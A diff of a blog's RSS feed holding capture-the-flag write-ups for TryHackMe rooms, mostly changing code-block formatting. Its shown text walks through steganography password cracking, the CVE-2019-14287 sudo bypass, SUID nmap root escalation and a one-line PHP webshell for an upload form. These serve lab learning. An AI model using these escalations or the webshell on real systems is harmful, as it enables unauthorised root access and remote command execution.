@@ -15,11 +15,11 @@
             <pubDate>Wed, 10 Aug 2022 15:32:00 +0000</pubDate>
             
             <guid>https://robscharf.github.io/posts/2022/08/thm-daily-bugle--write-up/</guid>
-            <description>About Biblioteca is a hard rated CTF room on TryHackMe. Rooting this box involves carrying out a successful CMS enumeration, SQLi, hash cracking, and binary-based privilege escalation.
+            <description>About Daily Bugle is a hard rated CTF room on TryHackMe. Rooting this box involves carrying out a successful CMS enumeration, SQLi, hash cracking, and binary-based privilege escalation.
 Note: I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
 Enumeration nmap Nmap scan report for &amp;lt;target-ip&amp;gt; Host is up, received user-set (0.10s latency). Scanned at 2022-06-16 15:11:23 EDT for 549s Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.</description>
             <content type="html"><![CDATA[<h2 id="about">About</h2>
-<p>Biblioteca is a <em>hard</em> rated CTF room on <a href="https://tryhackme.com/room/dailybugle">TryHackMe</a>. Rooting this box involves carrying out a successful CMS enumeration, SQLi, hash cracking, and binary-based privilege escalation.</p>
+<p>Daily Bugle is a <em>hard</em> rated CTF room on <a href="https://tryhackme.com/room/dailybugle">TryHackMe</a>. Rooting this box involves carrying out a successful CMS enumeration, SQLi, hash cracking, and binary-based privilege escalation.</p>
 <p><strong>Note:</strong> I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="nmap">nmap</h3>
@@ -868,115 +868,115 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 </span></span></span><span style="display:flex;"><span><span style="color:#c41a16">Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
 </span></span></span></code></pre></div><p>Next time, I will definitely try <a href="https://github.com/RickdeJager/stegseek">StegSeek</a>! This is going insanely slowly, so I think it&rsquo;s probably not the right way to go. However, the ftp brute-force above took ages too. I&rsquo;ll let it run in the background while I google other steg stuff.</p>
 <p>I learned about <a href="https://wiki.bi0s.in/steganography/stegsolve/">Stegsolve</a> which is a really cool little utility, but, sadly, not helpful here. The next thing to try is <a href="https://www.kali.org/tools/steghide/">steghide</a>:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>                                                         
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ steghide --extract -sf cute-alien.jpg
-</span></span><span style="display:flex;"><span>Enter passphrase: 
-</span></span><span style="display:flex;"><span>wrote extracted data to <span style="color:#c41a16">&#34;message.txt&#34;</span>.
-</span></span><span style="display:flex;"><span>                                                         
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ cat message.txt
-</span></span><span style="display:flex;"><span>Hi ----s,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Glad you find this message. Your login password is hackerrules!
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Don<span style="color:#000">&#39;</span>t ask me why the password look cheesy, ask agent R who <span style="color:#a90d91">set</span> this password <span style="color:#a90d91">for</span> you.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Your buddy,
-</span></span><span style="display:flex;"><span>----s
-</span></span></code></pre></div><p>Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ stegcracker cute-alien.jpg
-</span></span><span style="display:flex;"><span>StegCracker 2.1.0 - <span style="color:#000">(</span>https://github.com/Paradoxis/StegCracker<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Copyright <span style="color:#000">(</span>c<span style="color:#000">)</span> <span style="color:#1c01ce">2022</span> - Luke Paris <span style="color:#000">(</span>Paradoxis<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>StegCracker has been retired following the release of StegSeek, which 
-</span></span><span style="display:flex;"><span>will blast through the rockyou.txt wordlist within 1.9 second as opposed 
-</span></span><span style="display:flex;"><span>to StegCracker which takes ~5 hours.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>StegSeek can be found at: https://github.com/RickdeJager/stegseek
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>No wordlist was specified, using default rockyou.txt wordlist.
-</span></span><span style="display:flex;"><span>Counting lines in wordlist..
-</span></span><span style="display:flex;"><span>Attacking file <span style="color:#c41a16">&#39;cute-alien.jpg&#39;</span> with wordlist <span style="color:#c41a16">&#39;/usr/share/wordlists/rockyou.txt&#39;</span>..
-</span></span><span style="display:flex;"><span>Successfully cracked file with password: -----1doro1111
-</span></span><span style="display:flex;"><span>Tried <span style="color:#1c01ce">441203</span> passwords
-</span></span><span style="display:flex;"><span>Your file has been written to: cute-alien.jpg.out
-</span></span><span style="display:flex;"><span>-----1
-</span></span><span style="display:flex;"><span>                                                         
-</span></span><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ cat cute-alien.jpg.out
-</span></span><span style="display:flex;"><span>Hi ----s,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Glad you find this message. Your login password is hackerrules!
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Don<span style="color:#000">&#39;</span>t ask me why the password look cheesy, ask agent R who <span style="color:#a90d91">set</span> this password <span style="color:#a90d91">for</span> you.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Your buddy,
-</span></span><span style="display:flex;"><span>----s    
-</span></span></code></pre></div><p>Let&rsquo;s log in via <code>ssh</code> and find our user flag.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ ssh ----s@10.10.108.206
-</span></span><span style="display:flex;"><span>----s@10.10.108.206<span style="color:#000">&#39;</span>s password: 
-</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.3 LTS <span style="color:#000">(</span>GNU/Linux 4.15.0-55-generic x86_64<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
-</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
-</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  System information as of Mon May <span style="color:#1c01ce">23</span> 16:28:05 UTC <span style="color:#1c01ce">2022</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  System load:  1.07              Processes:           <span style="color:#1c01ce">99</span>
-</span></span><span style="display:flex;"><span>  Usage of /:   39.8% of 9.78GB   Users logged in:     <span style="color:#1c01ce">0</span>
-</span></span><span style="display:flex;"><span>  Memory usage: 19%               IP address <span style="color:#a90d91">for</span> eth0: 10.10.108.206
-</span></span><span style="display:flex;"><span>  Swap usage:   0%
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">75</span> packages can be updated.
-</span></span><span style="display:flex;"><span><span style="color:#1c01ce">33</span> updates are security updates.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Last login: Tue Oct <span style="color:#1c01ce">29</span> 14:26:27 <span style="color:#1c01ce">2019</span>
-</span></span><span style="display:flex;"><span>----s@agent-sudo:~$ ls
-</span></span><span style="display:flex;"><span>Alien_autospy.jpg  user_flag.txt
-</span></span><span style="display:flex;"><span>----s@agent-sudo:~$ cat user_flag.txt
-</span></span><span style="display:flex;"><span>🎌<span style="color:#c41a16">`</span>user flag<span style="color:#c41a16">`</span>🎌
-</span></span><span style="display:flex;"><span>----s@agent-sudo:~$ 
-</span></span></code></pre></div><p>While the secret agents certainly have more knowledge about image-based cryptography, I spot that they&rsquo;ve misspelled &ldquo;autopsy&rdquo; in the image file name, which, despite being a tiny victory helps my ego.</p>
+<pre tabindex="0"><code>                                                         
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ steghide --extract -sf cute-alien.jpg
+Enter passphrase: 
+wrote extracted data to &#34;message.txt&#34;.
+                                                         
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ cat message.txt
+Hi ----s,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+----s
+</code></pre><p>Coincidentally, the lethargic StegCracker process also just finished, giving us another route to the message.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ stegcracker cute-alien.jpg
+StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
+Copyright (c) 2022 - Luke Paris (Paradoxis)
+
+StegCracker has been retired following the release of StegSeek, which 
+will blast through the rockyou.txt wordlist within 1.9 second as opposed 
+to StegCracker which takes ~5 hours.
+
+StegSeek can be found at: https://github.com/RickdeJager/stegseek
+
+No wordlist was specified, using default rockyou.txt wordlist.
+Counting lines in wordlist..
+Attacking file &#39;cute-alien.jpg&#39; with wordlist &#39;/usr/share/wordlists/rockyou.txt&#39;..
+Successfully cracked file with password: -----1doro1111
+Tried 441203 passwords
+Your file has been written to: cute-alien.jpg.out
+-----1
+                                                         
+┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ cat cute-alien.jpg.out
+Hi ----s,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don&#39;t ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+----s    
+</code></pre><p>Let&rsquo;s log in via <code>ssh</code> and find our user flag.</p>
+<pre tabindex="0"><code>┌──(virtualtack㉿kali-bot)-[~/thm/agent-sudo]
+└─$ ssh ----s@10.10.108.206
+----s@10.10.108.206&#39;s password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon May 23 16:28:05 UTC 2022
+
+  System load:  1.07              Processes:           99
+  Usage of /:   39.8% of 9.78GB   Users logged in:     0
+  Memory usage: 19%               IP address for eth0: 10.10.108.206
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+----s@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+----s@agent-sudo:~$ cat user_flag.txt
+🎌`user flag`🎌
+----s@agent-sudo:~$ 
+</code></pre><p>While the secret agents certainly have more knowledge about image-based cryptography, I spot that they&rsquo;ve misspelled &ldquo;autopsy&rdquo; in the image file name, which, despite being a tiny victory helps my ego.</p>
 <p>Now let&rsquo;s try to get root. First, I check to see what our friend <code>----s</code> has <code>sudo</code> permissions to run:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -l
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>sudo<span style="color:#000">]</span> password <span style="color:#a90d91">for</span> ----s: 
-</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#a90d91">for</span> ----s on agent-sudo:
-</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
-</span></span><span style="display:flex;"><span>    <span style="color:#000">secure_path</span><span style="color:#000">=</span>/usr/local/sbin<span style="color:#c41a16">\:</span>/usr/local/bin<span style="color:#c41a16">\:</span>/usr/sbin<span style="color:#c41a16">\:</span>/usr/bin<span style="color:#c41a16">\:</span>/sbin<span style="color:#c41a16">\:</span>/bin<span style="color:#c41a16">\:</span>/snap/bin
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>User ----s may run the following commands on agent-sudo:
-</span></span><span style="display:flex;"><span>    <span style="color:#000">(</span>ALL, !root<span style="color:#000">)</span> /bin/bash
-</span></span></code></pre></div><p>Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows <code>----s</code> to run <code>bash</code> as any user except root – is quite sensible. However, unfortunately, <code>sudo</code> faithfully interprets <code>#-1</code> after the <code>-u</code> user flag and, upon checking for user number <code>-1</code>,  will run as user <code>0</code>: <code>root</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -u#-1 bash
-</span></span><span style="display:flex;"><span>root@agent-sudo:~# whoami
-</span></span><span style="display:flex;"><span>root
-</span></span></code></pre></div><p>This can also be done with <code>4294967295</code> instead of <code>-u</code>. h/t <a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">WhiteSource</a></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>----s@agent-sudo:~$ sudo -u#4294967295 bash
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>sudo<span style="color:#000">]</span> password <span style="color:#a90d91">for</span> ----s: 
-</span></span><span style="display:flex;"><span>root@agent-sudo:~# whoami
-</span></span><span style="display:flex;"><span>root
-</span></span></code></pre></div><p>Pretty crazy!</p>
+<pre tabindex="0"><code>----s@agent-sudo:~$ sudo -l
+[sudo] password for ----s: 
+Matching Defaults entries for ----s on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ----s may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+</code></pre><p>Well, that is lucky. I immediately google this command and discover CVE-2019-14287. This exploit works due to some remarkably simple logic. The security policy applied – which allows <code>----s</code> to run <code>bash</code> as any user except root – is quite sensible. However, unfortunately, <code>sudo</code> faithfully interprets <code>#-1</code> after the <code>-u</code> user flag and, upon checking for user number <code>-1</code>,  will run as user <code>0</code>: <code>root</code>.</p>
+<pre tabindex="0"><code>----s@agent-sudo:~$ sudo -u#-1 bash
+root@agent-sudo:~# whoami
+root
+</code></pre><p>This can also be done with <code>4294967295</code> instead of <code>-u</code>. h/t <a href="https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/">WhiteSource</a></p>
+<pre tabindex="0"><code>----s@agent-sudo:~$ sudo -u#4294967295 bash
+[sudo] password for ----s: 
+root@agent-sudo:~# whoami
+root
+</code></pre><p>Pretty crazy!</p>
 <p>Now for the final spy message of the box:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@agent-sudo:/# <span style="color:#a90d91">cd</span> /root
-</span></span><span style="display:flex;"><span>root@agent-sudo:/root# ls
-</span></span><span style="display:flex;"><span>root.txt
-</span></span><span style="display:flex;"><span>root@agent-sudo:/root# cat root.txt
-</span></span><span style="display:flex;"><span>To Mr.hacker,
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Congratulation on rooting this box. This box was designed <span style="color:#a90d91">for</span> TryHackMe. Tips, always update your machine. 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Your flag is 
-</span></span><span style="display:flex;"><span>🎌root flag🎌
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>By,
-</span></span><span style="display:flex;"><span>-----l a.k.a Agent R
-</span></span></code></pre></div><h3 id="notes">Notes</h3>
+<pre tabindex="0"><code>root@agent-sudo:/# cd /root
+root@agent-sudo:/root# ls
+root.txt
+root@agent-sudo:/root# cat root.txt
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+🎌root flag🎌
+
+By,
+-----l a.k.a Agent R
+</code></pre><h3 id="lessons-learned">Lessons Learned</h3>
 <p>I learned a lot from this box and enjoyed it a lot. In particular, I think building a familiarity with <code>binwalk</code> and the various tricks and utilities related to <a href="https://en.wikipedia.org/wiki/Steganography">steganography</a> - concealing data in other data or objects - will be useful down the road. Understanding and using CVE-2019-14287 was quite helpful, as well.</p>
 ]]></content>
         </item>
@@ -1157,76 +1157,78 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 <p>However, we know that WordPress relies on the execution of <code>.php</code> files to carry out work properly. Thus, we can simply use the platform&rsquo;s built-in text editor to replace the contents of an existing <code>.php</code> WordPress page with our reverse shell script. I went ahead and used <code>404.php</code>, as it is easily accessible and, honestly, it&rsquo;s just at the top of the list.</p>
 <p><img src="/images/mr-robot/mr-robot-ptm.png" alt="mr-robot-ptm"></p>
 <p>That worked nicely! We can then stabilize our shell via python with:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python -c <span style="color:#c41a16">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span style="display:flex;"><span>daemon@linux:/$ 
-</span></span></code></pre></div><p>and explore:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>daemon@linux:/$ ls
-</span></span><span style="display:flex;"><span>ls
-</span></span><span style="display:flex;"><span>bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
-</span></span><span style="display:flex;"><span>boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
-</span></span><span style="display:flex;"><span>daemon@linux:/$ <span style="color:#a90d91">cd</span> home 
-</span></span><span style="display:flex;"><span><span style="color:#a90d91">cd</span> home
-</span></span><span style="display:flex;"><span>daemon@linux:/home$ ls
-</span></span><span style="display:flex;"><span>ls
-</span></span><span style="display:flex;"><span>robot
-</span></span><span style="display:flex;"><span>daemon@linux:/home$ <span style="color:#a90d91">cd</span> robot
-</span></span><span style="display:flex;"><span><span style="color:#a90d91">cd</span> robot
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls
-</span></span><span style="display:flex;"><span>ls
-</span></span><span style="display:flex;"><span>key-2-of-3.txt	password.raw-md5
-</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls -la
-</span></span><span style="display:flex;"><span>ls -la
-</span></span><span style="display:flex;"><span>total <span style="color:#1c01ce">16</span>
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#1c01ce">2</span> root  root  <span style="color:#1c01ce">4096</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> .
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#1c01ce">3</span> root  root  <span style="color:#1c01ce">4096</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> ..
-</span></span><span style="display:flex;"><span>-r-------- <span style="color:#1c01ce">1</span> robot robot   <span style="color:#1c01ce">33</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> key-2-of-3.txt
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#1c01ce">1</span> robot robot   <span style="color:#1c01ce">39</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> password.raw-md5
-</span></span></code></pre></div><p>We can&rsquo;t read <code>key-2-of-3.txt</code> yet, but we can access <code>password.raw-md5</code> for a hashed version of a password, likely for the <code>robot</code> user. We can use <a href="https://crackstation.net/">crackstation.net</a> to crack it, and, if not, probaby <a href="https://www.openwall.com/john/">John the Ripper</a>.</p>
+<pre tabindex="0"><code>$ python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;
+daemon@linux:/$ 
+</code></pre><p>and explore:</p>
+<pre tabindex="0"><code>daemon@linux:/$ ls
+ls
+bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+daemon@linux:/$ cd home 
+cd home
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ cd robot
+cd robot
+daemon@linux:/home/robot$ ls
+ls
+key-2-of-3.txt	password.raw-md5
+daemon@linux:/home/robot$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+</code></pre><p>We can&rsquo;t read <code>key-2-of-3.txt</code> yet, but we can access <code>password.raw-md5</code> for a hashed version of a password, likely for the <code>robot</code> user. We can use <a href="https://crackstation.net/">crackstation.net</a> to crack it, and, if not, probaby <a href="https://www.openwall.com/john/">John the Ripper</a>.</p>
 <p>Luckily, crackstation.net recognizes the hash and gives us the decoded password:</p>
 <p><img src="/media/mr-robot-crackstation.png" alt="mr-robot-crackstation"></p>
 <p>We can now switch users (<code>su</code>) to <code>robot</code> and read <code>key-2-of-3.txt</code>. Now that we have gotten the second flag, let&rsquo;s look to escalate our privileges for <code>root</code> access and, presumably, the third flag.</p>
 <p>As a shortcut to obtaining root access, We can search for system files that have an SUID (Set User ID) bit set. Files with SUID bits allow them to run with the permissions of whomever the owner of the file is. If the owner happens to be <code>root</code>, it runs with root permissions.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/tmp$ find / -perm -u<span style="color:#000">=</span>s -type f 2&gt;/dev/null
-</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#000">=</span>s -type f 2&gt;/dev/null
-</span></span><span style="display:flex;"><span>/bin/ping
-</span></span><span style="display:flex;"><span>/bin/umount
-</span></span><span style="display:flex;"><span>/bin/mount
-</span></span><span style="display:flex;"><span>/bin/ping6
-</span></span><span style="display:flex;"><span>/bin/su
-</span></span><span style="display:flex;"><span>/usr/bin/passwd
-</span></span><span style="display:flex;"><span>/usr/bin/newgrp
-</span></span><span style="display:flex;"><span>/usr/bin/chsh
-</span></span><span style="display:flex;"><span>/usr/bin/chfn
-</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
-</span></span><span style="display:flex;"><span>/usr/bin/sudo
-</span></span><span style="display:flex;"><span>/usr/local/bin/nmap
-</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
-</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
-</span></span><span style="display:flex;"><span>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-</span></span><span style="display:flex;"><span>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
-</span></span></code></pre></div><p>We see that <code>nmap</code> in <code>/usr/local/bin/nmap</code>, interestingly, has an SUID bit set. Nice.</p>
+<pre tabindex="0"><code>robot@linux:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</code></pre><p>We see that <code>nmap</code> in <code>/usr/local/bin/nmap</code>, interestingly, has an SUID bit set. Nice.</p>
 <p>By checking <a href="https://gtfobins.github.io/gtfobins/nmap/#suid">GTFOBins</a> for <code>nmap</code> SUID escalations, we see that we can invoke <code>nmap</code>&rsquo;s &ldquo;interactive mode&rdquo; (available on versions 2.02 to 5.21, which can be used to execute shell commands via <code>nmap&gt; !sh</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/$ /usr/local/bin/nmap --interactive
-</span></span><span style="display:flex;"><span>/usr/local/bin/nmap --interactive
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Starting nmap V. 3.81 <span style="color:#000">(</span> http://www.insecure.org/nmap/ <span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#a90d91">for</span> <span style="color:#a90d91">help</span>
-</span></span><span style="display:flex;"><span>nmap&gt; !/bin/sh
-</span></span><span style="display:flex;"><span>!/bin/sh
-</span></span><span style="display:flex;"><span><span style="color:#177500"># whoami</span>
-</span></span><span style="display:flex;"><span>whoami
-</span></span><span style="display:flex;"><span>root
-</span></span><span style="display:flex;"><span><span style="color:#177500"># </span>
-</span></span></code></pre></div><p>&hellip;<em>et voilà</em>! We have root access and, by extension, the third flag.</p>
-<h3 id="notes">Notes</h3>
-<p>In retrospect, I would&rsquo;ve checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy <code>gobuster</code> scan, potentially saving time.</p>
-<p>Otherwise, this was an enjoyable CTF machine, especially for fans of the show.</p>
+<pre tabindex="0"><code>robot@linux:/$ /usr/local/bin/nmap --interactive
+/usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !/bin/sh
+!/bin/sh
+# whoami
+whoami
+root
+# 
+</code></pre><p>&hellip;<em>et voilà</em>! We have root access and, by extension, the third flag.</p>
+<h3 id="lessons-learned">Lessons Learned</h3>
+<ul>
+<li>In retrospect, I would&rsquo;ve checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy <code>gobuster</code> scan, potentially saving time.</li>
+<li>Otherwise, this was an enjoyable CTF machine, especially for fans of the show.</li>
+</ul>
 ]]></content>
         </item>
         
         <item>
-            <title>How to: Add a backtick hotkey to Windows 10</title>
+            <title>How-to: Add a backtick hotkey to Windows 10</title>
             <link>https://robscharf.github.io/posts/2022/05/how-to-add-a-backtick-hotkey-to-windows-10/</link>
             <pubDate>Tue, 03 May 2022 13:00:00 +0000</pubDate>
             
@@ -1297,21 +1299,21 @@ Task 1 - Getting Started The room begins with a necessary configuration step. Th
 <h3 id="methodology">Methodology</h3>
 <h4 id="webshells">Webshells</h4>
 <p>For a given webpage with upload form, run something like a <a href="">GoBuster</a> scan on <code>dir</code> mode, using a relevant wordlist with <code>-w</code>.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
-</span></span></code></pre></div><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#000">&lt;?</span><span style="color:#000">php</span> 
-</span></span><span style="display:flex;"><span>	<span style="color:#a90d91">echo</span> <span style="color:#000">system</span>(<span style="color:#000">$_GET</span>[<span style="color:#c41a16">&#34;cmd&#34;</span>]);
-</span></span><span style="display:flex;"><span><span style="color:#633820">?&gt;</span><span style="color:#000">
-</span></span></span></code></pre></div><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
+<pre tabindex="0"><code>gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
+</code></pre><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
+<pre tabindex="0"><code>&lt;?php 
